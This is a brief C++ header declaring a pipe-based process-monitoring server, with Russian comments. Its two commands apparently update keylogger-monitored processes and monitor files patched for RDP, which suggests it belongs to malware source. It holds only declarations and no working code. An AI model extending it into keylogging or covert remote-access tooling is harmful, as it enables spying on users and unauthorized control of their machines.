#pragma once

#include "core\core.h"
#include "core\pipe.h"

namespace MonitoringProcesses
{

bool Start();

}

class MonProcessServer : public PipeServer
{

	public:
		
		enum 
		{
			CmdUpdateKlg,	//обновление мониториемых процессов
			CmdRDP			//включить режим мониторинга файлов которые патчатся для RDP
		};

	private:

		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );
		virtual void Disconnect();

	public:

		MonProcessServer();
		~MonProcessServer();

		bool Reg();

};
